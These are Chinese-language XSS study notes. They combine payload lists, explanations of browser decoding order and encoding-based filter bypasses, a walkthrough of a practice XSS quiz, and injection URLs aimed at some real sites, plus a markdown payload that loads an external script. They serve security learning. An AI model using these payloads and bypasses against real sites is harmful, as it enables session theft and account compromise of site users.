# XSS


## 实操

```html
"><script>alert("xss");</script><"
被转义成
&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;&quot;


'';!--"<XSS>=&{()}
'';!--&quot;&lt;XSS&gt;=&amp;{()}


```


测试语句：

http://wooyun.jozxing.cc/static/drops/tips-1955.html
http://wooyun.jozxing.cc/static/drops/tips-845.html

```html
<script>alert(1);</script>
<script>prompt(1);</script>
<script>confirm(1);</script>
<script src=data:,alert(1)<!--

事件触发
<svg/onload=prompt(1);>
<marquee/onstart=confirm(2)>/
<body onload=prompt(1);>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="javascript:alert(1)">
```




## 知识点
-----

## 转义与对抗转义
escape()
已编码的 string 的副本。其中某些字符被替换成了十六进制的转义序列。该方法不会对 ASCII 字母和数字进行编码，也不会对下面这些 ASCII 标点符号进行编码`： * @ - _ + . /` 。其他所有的字符都会被转义序列替换。

```
< > ' "
```
### 用[0xc0]对抗\的转义
```js
jsunicode中，可用u003c和u003e来代替<和>
但是被转义后u前加了\,变成document.getElementById("test").innerHTML =" \u003cimg src=1 onerror=alert(/xss/)\u003e";
对于gb2312编码，” [0xc0] “是一个合法的编码，显示为：”繺”。
对于UTF-8编码，在IE6下，上述组合也是一个合法的编码。
其中[0xc0]表示一个十六进制的值。
callback({"name":"[0xc0]u003cimg src=1 onerror=alert(/xss/) [0xc0]u003e"});
转义后成：
callback({"name":"[0xc0]\u003cimg src=1 onerror=alert(/xss/) [0xc0]\u003e"});
JS解码时变成了：
callback({"name":"繺u003cimg src=1 onerror=alert(/xss/) 繺u003e"});
这样<>就出现了。
```


```html
1
<vmlframe xmlns="urn:schemas-microsoft-com:vml" style="behavior:url(#default#vml);position:absolute;width:100%;height:100%" src="http://itsokla.duapp.com/shouzi.vml#xss"></vmlframe>


&lt;vmlframe xmlns="urn:schemas-microsoft-com:vml" style="behavior:url(#default#vml);position:absolute;width:100%;height:100%" src="<a href="http://itsokla.duapp.com/shouzi.vml#xss%22&gt;&lt;/vmlframe">http://itsokla.duapp.com/shouzi.vml#xss"&gt;&lt;/vmlframe</a>&gt;

2
<vmlframe xmlns="urn:schemas-microsoft-com:vml" style="behavior:url(#default#vml);position:absolute;width:100%;height:100%" src="1#xss"></vmlframe>


src="http://1<script>alert(/testxss/)<script>"

```


http://www.anquan.us/static/bugs/wooyun-2012-015979.html

```html
code 区域
http://mail.qq.com/cgi-bin/login?vt=passport&ss=\&from==0;alert(1);function/**/from(){};//&delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1

1 &符号的优先级高于=，而==高于&，所以用from==0
2 会出现from无定义的情况，用function from(){}
3 %20被转义，用/**/
```


## 反射型XSS



### flash反射型XSS
http://bailitop.com/statics/js/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss%22%29}}//


## 存储型XSS

## DOM型XSS


## 字符编码和浏览器解析原理
有三个解析器：HTML解析、JS解析和URL解析。

```
HTML解析------------>URL解析------------->伪协议解析
html10进制          URLdecode             data--------->base64
html16进制                                javascript--->jsunicode/js8进制/js10进制

```

常规：
```html
<a href="javascript:alert(1)">test</a>
```
首先HTML解析器开始工作，并对href中的字符做HTML解码，href调用URL解析器对其值进行解码，该环境中URL资源类型为JavaScript，因此调用JavaScript解析器进行解码操作，最后解析的脚本被执行。

三层编码实例：
```html
原始：<a href="javascript:alert(1)">test</a>
1 JS编码：<a href="javascript:\u0061\u006c\u0065\u0072\u0074(3)">test3</a>
2 URL编码：<a href="javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)">test3</a>
注：不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型,所以上面的"javascript:"不能动。
3 HTML编码：<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#51;&#49;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#54;&#51;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#51;&#53;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#55;&#37;&#51;&#50;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#55;&#37;&#51;&#52;&#40;&#51;&#41;">test3</a>
```
解码顺序为：HTML解码->URL解码->JavaScript解码


不同位置解码过程：
```html
<a onclick="window.open('value1')" href="javascript:window.open('value2')">
这里onclick是执行js解析器。window.open执行URL解析器
```
浏览器解码顺序：
1. Value1：HTML解码->JavaScript解码->URL解码
2. Value2：HTML解码->URL解码->JavaScript解码->URL解码


调用URL解析器的属性：
```
href=
action=
formaction=
location=
on*=
name=
background=
poster=
src=
code=
```

## 字符实体编码(10进制与16进制)

原理：

1. 字符实体是用一个编号写入HTML代码中来代替一个字符，有10进制和16进制，，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。
2. javascript可以解码

实例：
```html
如把尖括号编码[ < ]  -----> html十进制: &#60;  html十六进制:&#x3c;

<img src="x" onerror="alert(1)">
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

```

```html
1 输入【wooyun%26%23x27,alert(1)%2b%26%23x27】
2 服务器解码base64，返回【wooyun&#x27,alert(1)+&#x27】
3 本地浏览器解码html16进制，变成【wooyun',alert(1) '】
4 javascript:伪协议中执行了改语句，就实现了xss
```

## 字符字体分号可以去掉，数字前可以加0

原理：

绕过waf

```hmtl
【&#39;】可以用【&#39】

【&#39;】可以用【&#039;】

【&#39;】可以用【&#000000039】
```


## javascript解码

原理：
识别三种编码：Jsunicode js8进制 js10进制，其中js8进制最短。



```js
如把尖括号编码[ < ]  ----->jsunicode:\u003c js八进制:\74  js十六进制:\x3c
```


## base64编码
原理：
要使用伪协议还原base64
```html
如把尖括号编码[ < ]  -----> url: %3C  base64: PA==
<a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">test</a>
```

## html5新增实体编码
```html
&colon; => [冒号]
&NewLine; => [换行]
<a href="javasc&NewLine;ript&colon;alert(1)">click</a>
```


## tab回车换行/综合利用
```html
html编码里加入09(tab),10(换行)和13(回车)
tab
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav   ascript:alert('XSS');">
换行
<a href="javasc&NewLine;ript&colon;alert(1)">click</a>
回车
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

javascript&#00058;alert(1)
javas&Tab;cript:\u0061lert(1);
javascript:\u0061lert&#x28;1&#x29
javascript&#x3A;alert&lpar;document&period;cookie&rpar;

vbscript:alert(1);
vbscript&#00058;alert(1);
vbscr&Tab;ipt:alert(1)"
```

## markdown中的XSS


1 引用处使用了伪协议
```
[XSS](javascript:alert(1))
```
2 图片描述处无过滤

![头像" onload=alert(1);//](https://www.xxx.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg)


![头像" onload=s=createElement('script');body.appendChild(s);s.src='外部js的url';//](https://www.xxx.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg)

## XSS平台

https://github.com/testsecer/XssApp


## 资料

XSStrike 源码阅读

http://chybeta.club/2018/03/10/XSStrike-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/#more

学习文章

http://www.anquan.us/search?keywords=%E8%85%BE%E8%AE%AF%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B&content_search_by=by_bugs

编码
http://wooyun.jozxing.cc/static/drops/tips-689.html

浅谈XSS—字符编码和浏览器解析原理

https://security.yirendai.com/news/share/26

html属性白名单

http://htmlpurifier.org/

## 练习
---

防御：

htmlspecialchars:【&】->【&amp;】、【<】->【&lt;】、【>】->【&gt;】、【”】->【&guot;】、【’】->【&#039;】;
思路：
可以用【)】、【(】、【;】
https://***.vip/qq/qq.php?qq=123&tre=11111);alert();var a =(&btnSend=%E5%BC%80%E5%A7%8B%E8%BD%B0%E7%82%B8
中间用了两个括号闭合两边。

防御：
过滤了上一个的所有符号
思路：
使用伪协议：协议【JavaScript】、【vbscript】、【data】协议，当然最好的做法还是白名单，仅允许【http】、【https】协议
http://www.**bug.cn/content/plugins/openlink/viewPage.html?url=http://www.baidu.com
http://www.**bug.cn/content/plugins/openlink/viewPage.html?url=JavaScript:alert``


防御：
&lt;&gt; { } @ * _ + - . / ;   ? : @ &amp; = + $ , # ' ( )
无法用<>&
思路：
将payload放在第二个参数处
"><script>alert(document.domain);</script>

防御：
前端修改长度限制
思路：
修改maxlength就行了

防御：
" > < > { } @ * _ + - . / ;   ? : @ &amp; = + $ , # ' ( ) 
&gt;&lt;script&gt;alert(document.domain);&lt;="" script&gt;"="" type="text">
<input name="p1" size="50" value="" &gt;="" &lt;="" {="" }="" @="" *="" _="" +="" -="" .="" ;="" ?="" :="" &amp;amp;="+" $="" ,="" #="" '="" (="" )="" "="" type="text">
思路：
修改函数属性
"onclick=alert(document.domain);"
然后点一下框

防御：
<input name="p1" size="50" value="“" &gt;="" &lt;="" {="" }="" @="" *="" _="" +="" -="" .="" ;="" ?="" :="" &amp;="+" $="" ,="" #="" &#39;="" (="" )="" 空格="" &lt;&quot;="" type="text">
思路：
" onclick=alert(document.domain); "
1 onmouseover=alert(document.domain);
鼠标移动触发


https://xss-quiz.int21h.jp/stage008.php?
防御：
<a href="123">123</a>
思路：
javascript:alert(document.domain);

漏洞：
euc-JP
IE7的utf-7编码XSS
思路：
Ps:大部分浏览器都修正了这个错误，但是IE还是有的。。
使用360浏览器里的IE内核模式
使用utf-7转码工具
" onmousemove="alert(document.domain)  
转：
+ACIAIABvAG4AbQBvAHUAcwBlAG0AbwB2AGUAPQAiAGEAbABlAHIAdAAoAGQAbwBjAHUAbQBlAG4AdAAuAGQAbwBtAGEAaQBuACk-  
并且修改charset为type=text，输入:UTF-7
回车，OK


防御：
<SCRIPT>alert(document.);</SCRIPT>
s/domain//g;
过滤了domain
思路：
"><script>alert(document.dodomainmain);</script>

防御：
script->xscript
onclick->onxxx
on类都不行
s类都不行
"s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;"  
思路：
"><a href="javascr&#09;ipt:alert(document.domain);">12</a>

防御：
“{}@*_+-./;?:@&=+$,#()
过了"<>空格x00到x20
"s/[\x00-\x20\<\>\"\']//g;"  
思路：
用`来过，用``来代替“
" ``onmouseover=alert(document.domain);

防御：
根据提示，需要控制style的属性，style跟JS连接的属性有expression(JS)，url(JS)。需要注意的是expression是IE浏览器早期版本中的CSS属性值，实验使用IE 6浏览器。
思路：
background-color:#f00;
background:url("javascript:alert(document.domain);");
background-color:#f00;background:url(``javascript:alert(document.domain);``);
background-color:#f00;background:expression(alert(document.domain););
background-image:url("javascript:alert(document.domain);");
不成功
